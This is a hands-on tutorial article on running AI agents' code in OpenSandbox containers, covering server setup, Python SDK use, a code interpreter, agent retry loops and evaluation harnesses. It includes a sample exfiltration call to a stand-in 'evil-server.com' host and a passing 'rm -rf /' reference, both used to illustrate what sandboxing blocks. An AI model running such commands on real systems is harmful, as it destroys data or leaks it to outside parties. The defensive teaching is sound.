OpenSandbox: Let Your AI Agents Run Code Without Burning Your House Down

Alibaba just open-sourced a sandbox platform that gives AI agents isolated environments to execute code, browse the web, and interact with desktops — all without touching your real machine.
35 min sandboxing agent-infrastructure code-execution docker kubernetes

What's happening

Here's the problem that's been quietly bugging everyone building AI agents: you want your agent to run code, but you don't want it to rm -rf / your laptop.

Every coding assistant — Claude Code, Cursor, Devin, you name it — eventually needs to execute something. Test a function. Install a dependency. Run a script. But giving an LLM raw access to your terminal is like handing your car keys to someone who learned to drive from YouTube.

Alibaba just dropped OpenSandbox as an open-source project, and it's genuinely useful. It's a platform that spins up isolated Docker (or Kubernetes) containers on demand, gives your AI agent a clean environment to work in, and tears it all down when it's done. Think of it like a disposable laptop that exists for 10 minutes, lets your agent do whatever it wants, and then vanishes.

The cool part? It has SDKs for Python, TypeScript, Java, Go, and more — so you can wire it into basically any agent framework. It supports code interpreters (think Jupyter-style execution), file I/O, shell commands, even browser automation. And it has network egress controls so your sandbox can't phone home to sketchy servers.

Today we're going to set it up locally, get an agent to build us a sandbox workflow, and explore how this fits into real agent architectures.

1

Get the Sandbox Server Running Locally

Before we do anything fancy, we need the OpenSandbox server running on our machine. This is the thing that actually manages container lifecycles — creating sandboxes, killing them, routing commands to them.

The mental model here is simple: OpenSandbox Server is like a hotel front desk for containers. Your agent checks in (creates a sandbox), does its thing in the room (runs code), and checks out (sandbox gets destroyed). The front desk handles all the logistics.

You need Docker installed and running — that's the only real prerequisite. OpenSandbox uses Docker containers under the hood for local development (and can scale to Kubernetes for production).

Ask your agent
Get the agent to walk you through installing and starting the OpenSandbox server locally with Docker
Think about it
  • What are the prerequisites the server needs? (Think: runtime, Python version)
  • There's a pip-installable server package and a config initialization step — what would you ask the agent to set up?
  • How would you tell the agent you want the Docker-based local configuration, not the Kubernetes one?
What the agent gives back

The agent should give you a short sequence of three terminal commands: install the opensandbox-server package via uv pip, run the config initializer pointed at Docker mode, and then start the server. Something like:

```bash

uv pip install opensandbox-server

opensandbox-server init-config ~/.sandbox.toml --example docker

opensandbox-server

```

It might also mention that you can clone the repo and run from source if you prefer, but the pip install path is cleaner for getting started.

Warning
Docker must be running before you start the server. If you're on macOS, make sure Docker Desktop is open — the daemon won't be running otherwise.
Tip
The config file at ~/.sandbox.toml controls everything — runtime type, default timeouts, network policies. We'll poke at it later, but for now the example Docker config works out of the box.
What's actually happening when the server starts?

The OpenSandbox server is a Python service that exposes a REST API for sandbox lifecycle management. When you create a sandbox, it tells Docker to spin up a container from a specific image (like opensandbox/code-interpreter:v1.0.1). When you run a command, it exec's into that container. When you kill the sandbox, it stops and removes the container.

This is basically what cloud notebook platforms like Google Colab do — but as an API you can wire into any agent. The key insight is that the protocol is standardized, so any SDK in any language can talk to the same server.

2

Create Your First Sandbox and Run Code In It

Now the fun part. We're going to use the Python SDK to create a sandbox, run a shell command, write a file, and read it back. This is the bread and butter of what your AI agents will do.

Think of a sandbox like a fresh virtual machine that boots in seconds. It has its own filesystem, its own shell, its own Python installation. Your agent can do anything inside it — install packages, create files, run scripts — and nothing leaks out to your real machine.

The lifecycle is dead simple:

  1. Create — spin up a container from an image
  2. Use — run commands, read/write files, execute code
  3. Kill — destroy the container and all its contents

Let's get our agent to build us a script that does all three.

Ask your agent
Get the agent to build a Python script that creates an OpenSandbox sandbox, runs a shell command, writes and reads a file, then cleans up
Think about it
  • The SDK has two key packages: `opensandbox` for the sandbox itself and `opensandbox-code-interpreter` for running code. Which do we need for this step?
  • Sandboxes are async — how should you tell the agent to structure the script?
  • What image should the sandbox use? Think about what built-in images OpenSandbox provides.
  • Don't forget cleanup — what happens if the script crashes before killing the sandbox?
What the agent gives back

The agent should give you an async Python script that creates a sandbox using Sandbox.create() with the code interpreter image, uses async with sandbox for safe cleanup, runs echo via sandbox.commands.run(), writes a file with sandbox.files.write_files(), and reads it back with sandbox.files.read_file(). The key pattern to notice is:

```python

sandbox = await Sandbox.create(

"opensandbox/code-interpreter:v1.0.1",

timeout=timedelta(minutes=10),

)

async with sandbox:

result = await sandbox.commands.run("echo hello")

... do stuff ...

```

The async with block is the important bit — it ensures the sandbox gets killed even if your code throws an error. Think of it like a finally block for infrastructure.

Tip
The timeout parameter is your safety net. If your agent gets stuck in an infinite loop inside the sandbox, it'll auto-destroy after the timeout. For development, 10 minutes is fine. For production agents, you might want 2-5 minutes.
Why async? Can't I just use regular Python?

OpenSandbox is async-first because sandbox operations involve network calls to the server (which talks to Docker). If you made these synchronous, your agent would be sitting there blocked every time it runs a command or reads a file. With async, you can potentially manage multiple sandboxes concurrently — which matters a lot in evaluation pipelines where you might be testing 50 code submissions at once.

If you're not comfortable with async Python, don't sweat it. The pattern is always the same: await before any sandbox operation, and wrap everything in an async def main() that you kick off with asyncio.run(main()). Your agent can handle the boilerplate.

✓
At this point, you should have the OpenSandbox server running locally via Docker, and you've successfully created a sandbox, run a command, and done file I/O. The sandbox was automatically cleaned up. You've got the basic lifecycle down — create, use, destroy.
3

Add a Code Interpreter — Now Your Agent Can Run Real Code

Shell commands are fine, but the real power is the Code Interpreter. This is basically a Jupyter kernel running inside your sandbox. Your agent can send Python code (or other languages), get the output back, and iterate — just like ChatGPT's Code Interpreter, except you control the infrastructure.

Here's why this matters for agent builders: when your LLM generates code, you need to test that code somewhere safe before trusting it. The Code Interpreter gives you a stateful execution environment — variables persist between runs, imports stick around, you can build up complex computations step by step.

The analogy: if a sandbox is a disposable laptop, the Code Interpreter is opening a Python REPL on that laptop. It remembers what you did last, and you can keep building on it.

Ask your agent
Get the agent to extend your sandbox script to create a Code Interpreter, run some Python code, and show how state persists between executions
Think about it
  • The Code Interpreter is created FROM an existing sandbox — what does that API call look like?
  • How would you demonstrate that the interpreter is stateful? Maybe define a variable in one call and use it in the next?
  • What language parameter does the interpreter need? OpenSandbox supports multiple languages.
What the agent gives back

The agent should add a CodeInterpreter.create(sandbox) call inside your existing sandbox context, then show two sequential interpreter.codes.run() calls — the first defines a variable, the second uses it. This proves the interpreter maintains state between runs. The key pattern:

```python

interpreter = await CodeInterpreter.create(sandbox)

result1 = await interpreter.codes.run(

"x = 42", language=SupportedLanguage.PYTHON

)

result2 = await interpreter.codes.run(

"print(x * 2)", language=SupportedLanguage.PYTHON

)

result2 prints 84 — state persisted!

```

The agent should explain that this is like having a persistent REPL session, not just running scripts in isolation.

Tip
The SupportedLanguage enum tells the interpreter which kernel to use. Python is the most common, but check OpenSandbox docs for other supported languages. Your agent can help you explore what's available.
Warning
The Code Interpreter image (opensandbox/code-interpreter:v1.0.1) needs to be pulled the first time. If sandbox creation seems slow, that's Docker downloading the image — subsequent runs will be fast.
How does this compare to ChatGPT's Code Interpreter?

ChatGPT's Code Interpreter is essentially the same idea — a sandboxed Python environment that runs code and returns results. The difference is ownership and flexibility:

  • ChatGPT's: managed by OpenAI, you can't customize the environment, you can't control network access, you can't use it outside of ChatGPT
  • OpenSandbox: you run the server, you pick the Docker image, you control network egress, you can use it with ANY LLM or agent framework

For hobby projects, ChatGPT's built-in interpreter is fine. For production agent systems where you need custom packages, security controls, or scale — that's where OpenSandbox earns its keep.

Quick Check

Your AI coding agent generates a Python script that installs `numpy` and processes some data. Where should it execute this code?
✓ Correct! This is exactly the use case. The sandbox isolates the pip install and execution. If the LLM-generated code has bugs or does something unexpected, it's contained. The sandbox gets destroyed after, so no leftover packages pollute your environment.
✗ Not quite. Running LLM-generated code directly on your machine is risky. Even if you trust the LLM, hallucinated package names could install malware from PyPI, and buggy file operations could modify real files. Sandboxing exists precisely to avoid this.
✗ Not quite. A virtualenv isolates Python packages but does NOT isolate the filesystem or network. The generated code can still read your files, make network requests, or run system commands. It's package isolation, not security isolation — a very different thing.
4

Wire It Into an Agent Loop — The Real Architecture

So we can create sandboxes and run code. Cool. But the real magic happens when you plug this into an agent loop. Here's the pattern that most coding agents follow:

  1. User gives a task → "Write a function that sorts a list of dictionaries by a nested key"
  2. LLM generates code
  3. Agent sends the code to a sandbox for execution
  4. Sandbox returns output (or errors)
  5. Agent feeds the result back to the LLM: "Your code raised a KeyError on line 3"
  6. LLM fixes the code, go to step 3
  7. Repeat until the code works

This loop is the heart of every coding assistant. The sandbox is step 3-4 — the safe execution layer between the LLM brain and the real world.

Let's get our agent to build a simple version of this loop.

Ask your agent
Get the agent to build a simple 'generate-execute-iterate' loop: take a coding task as input, send it to an LLM, run the generated code in an OpenSandbox, capture errors, and retry up to 3 times
Think about it
  • What LLM client should the agent use to generate the code? (Any will do — OpenAI, Anthropic, etc.)
  • How should the agent capture both stdout AND stderr from the sandbox execution? Errors are the key signal for iteration.
  • What's the exit condition? When does the loop stop retrying?
  • How would you structure the prompt to the LLM on retry? It needs to see the previous code AND the error message.
What the agent gives back

The agent should give you a function that takes a task description, calls an LLM to generate code, runs it in a sandbox via the Code Interpreter, checks for errors, and if there are errors, feeds the code + error back to the LLM for another attempt. The key insight is the retry prompt — something like: 'Your previous code produced this error: {error}. Here was the code: {code}. Fix it.'

The overall structure is a for loop (max 3 iterations) wrapping two async calls: one to the LLM API, one to interpreter.codes.run(). If the result has no errors, break early. The sandbox stays alive for the whole loop so state persists between attempts.

This is conceptually simple but incredibly powerful — it's the same pattern that makes Devin, Claude Code, and similar tools work.

API Key Note
You'll need an API key for whatever LLM you use in the agent loop (OpenAI, Anthropic, etc.). The OpenSandbox server itself doesn't require an API key — it's all local.
Tip
Pro move: set a short timeout on the sandbox execution (like 30 seconds per run). If the LLM generates an infinite loop, you don't want to wait 10 minutes to find out.
What about network egress controls?

One of OpenSandbox's underrated features is per-sandbox egress controls. You can specify which external hosts the sandbox is allowed to reach. This matters because:

  • If your LLM generates code that does requests.get('https://evil-server.com/exfiltrate'), the sandbox can block it
  • You might want to allow pypi.org (for pip installs) but block everything else
  • For evaluation pipelines, you want zero network access to prevent cheating

This is configured in the ~/.sandbox.toml file or per-sandbox at creation time. It's the kind of thing you don't think about until something goes wrong — and then you're really glad it's there.

How does this scale to production?

Locally, OpenSandbox uses Docker — one container per sandbox. This works fine for development and small-scale use (maybe 10-20 concurrent sandboxes).

For production, OpenSandbox supports a Kubernetes runtime that can handle hundreds or thousands of concurrent sandboxes. The API is the same — you just change the runtime configuration. This is how you'd build something like a coding interview platform or an automated grading system that needs to evaluate submissions at scale.

The architecture is also designed for this: the server is stateless, sandboxes are ephemeral containers, and the protocol is standardized. You could even run multiple servers behind a load balancer.

✓
You now have the full picture: a running server, sandbox lifecycle management, a Code Interpreter for executing code, and the agent loop pattern that ties it all together. You've essentially built the execution layer of a coding assistant.
5

Bonus: Sandboxes for Agent Evaluation

Here's a use case that doesn't get enough attention: using sandboxes to evaluate your AI agents themselves.

Imagine you're building a coding agent and you want to know: "Can my agent correctly solve 100 Python problems?" You need to:

  1. Give each problem to your agent
  2. Let the agent generate code
  3. Run that code against test cases
  4. Score the results

Every single run needs its own isolated sandbox. You can't let test runs interfere with each other. You can't let a rogue agent break the evaluation environment for the next test.

This is exactly what benchmarks like HumanEval and SWE-bench do — and OpenSandbox is built for it. You can spin up dozens of sandboxes in parallel, each running a different test case, all isolated from each other.

The evaluation pipeline is just a variation of the agent loop from Step 4, but running in parallel across many tasks.

Ask your agent
Get the agent to sketch an evaluation harness: given a list of coding problems (each with a prompt and test cases), run your agent on each one in a separate sandbox and collect pass/fail results
Think about it
  • How would you run multiple sandboxes concurrently? Think about Python's async concurrency primitives.
  • Each sandbox needs to be independent — why is this important for evaluation integrity?
  • How do you determine pass/fail? The test cases need to run AFTER the agent's generated code.
  • What information do you need to collect from each run for scoring?
What the agent gives back

The agent should describe a pattern where you use asyncio.gather() (or similar) to create multiple sandboxes in parallel, each running one problem. For each sandbox: inject the agent's generated code, then run the test cases, then check if all tests passed. Collect results into a simple list of pass/fail outcomes.

The key architectural insight is that each sandbox is completely isolated — problem 47's runaway infinite loop can't affect problem 48's evaluation. This is why containers matter for eval, not just security.

Tip
For evaluation, set strict timeouts (30-60 seconds) and disable network egress entirely. You want to test the agent's code generation ability, not its ability to curl Stack Overflow.
What other sandbox scenarios does OpenSandbox support?

Beyond code execution and evaluation, OpenSandbox has built-in support for some surprisingly rich scenarios:

  • Browser automation: Sandboxes can include Chrome and Playwright, so your GUI agent can navigate websites in an isolated browser
  • Desktop environments: VNC-based sandboxes give your agent a full desktop with VS Code — useful for testing GUI interactions
  • RL training: Reinforcement learning environments where the agent interacts with a sandbox as its environment

The common thread is isolation. Any time you want an AI agent to interact with something that could be dangerous or unpredictable, stick a sandbox boundary around it.

Recap

We went from zero to a working sandbox-backed agent execution layer. Here's the journey:

Server setup — We installed the OpenSandbox server and pointed it at Docker. One config file, three commands, done.

Sandbox lifecycle — We created containers on demand, ran commands, did file I/O, and cleaned up safely with async with. The disposable laptop mental model.

Code Interpreter — We layered a stateful REPL on top of the sandbox, so our agent can iterate on code just like a developer would in a Jupyter notebook.

The agent loop — We wired it all together: LLM generates code → sandbox runs it → errors feed back to the LLM → iterate until it works. This is the pattern behind every coding assistant.

Evaluation at scale — We saw how the same infrastructure powers agent benchmarking — parallel sandboxes, isolated test runs, automated scoring.

The big idea? Sandboxing isn't just about safety — it's about giving your agent permission to be bold. When the blast radius of a mistake is zero, your agent can try wild things, fail fast, and learn. That's how you build agents that actually work.

  • OpenSandbox gives AI agents isolated Docker/K8s containers to safely run arbitrary code — the execution layer every coding agent needs
  • The Code Interpreter provides stateful execution (variables persist between runs), enabling the generate-execute-iterate loop that makes coding agents effective
  • Network egress controls let you decide exactly what your sandbox can access — critical for both security and evaluation integrity
  • The same infrastructure works for development (Docker, single sandbox) and production (Kubernetes, thousands of concurrent sandboxes)
  • Sandboxes aren't just safety theater — they unlock bolder agent behavior by making failure cheap and contained
